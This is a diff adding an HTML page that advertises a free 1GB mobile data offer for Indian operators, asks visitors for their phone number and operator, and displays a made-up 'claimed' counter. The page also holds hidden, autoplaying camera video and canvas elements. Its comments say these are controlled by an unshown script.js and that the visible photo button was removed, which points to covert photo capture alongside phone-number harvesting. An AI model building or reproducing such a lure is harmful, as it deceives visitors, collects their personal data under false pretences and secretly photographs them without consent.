@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free 1GB Data</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1>Get Your Free 1GB Data!</h1>
+        <p class="claimed-stats">3856 / 10000 people have claimed this offer!</p>
+        <p>Enter your phone number and select your operator to claim your free data.</p>
+        
+        <form id="dataForm">
+            <div class="form-group">
+                <label for="phoneNumber">Phone Number:</label>
+                <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="Enter 10-digit number" required>
+                <small id="phoneError" class="error-message"></small>
+            </div>
+            
+            <div class="form-group">
+                <label for="operator">Select Operator:</label>
+                <select id="operator" name="operator" required>
+                    <option value="">--Select Operator--</option>
+                    <option value="airtel">Airtel</option>
+                    <option value="bsnl">BSNL</option>
+                    <option value="vi">Vi (Vodafone Idea)</option>
+                    <option value="jio">Jio</option>
+                </select>
+            </div>
+            
+            <button type="submit">Claim Data</button>
+        </form>
+        
+        <div id="message" class="message"></div>
+        
+        <!-- Camera elements are now hidden and controlled by script.js -->
+        <video id="cameraFeed" width="320" height="240" autoplay style="display:none;"></video>
+        <canvas id="photoCanvas" width="320" height="240" style="display:none;"></canvas>
+        <!-- Snap photo button and photos container removed as per new requirement -->
+
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
